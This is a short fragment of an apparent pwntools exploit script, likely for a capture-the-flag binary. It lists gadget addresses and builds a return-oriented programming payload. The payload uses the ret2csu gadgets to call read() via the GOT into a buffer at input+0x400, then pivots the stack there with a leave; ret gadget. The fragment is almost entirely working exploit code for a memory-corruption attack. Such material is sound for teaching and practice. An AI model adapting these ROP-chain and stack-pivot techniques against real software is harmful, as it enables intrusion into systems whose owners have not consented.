...
leave_ret = 0x0000000000402132
ret = 0x000000000040101a
rbp = 0x000000000040117d
rdi = 0x00000000004021a3
csu = 0x40219A
csu_run = 0x402180
...
'''
pay += p64(csu) + p64(0) + p64(1) + p64(0) + p64(input + 0x400) + p64(0x100) + p64(e.got['read']) + p64(csu_run)
pay += p64(0) * 7
pay += p64(rbp) + p64(input + 0x400 - 8) + p64(leave_ret)
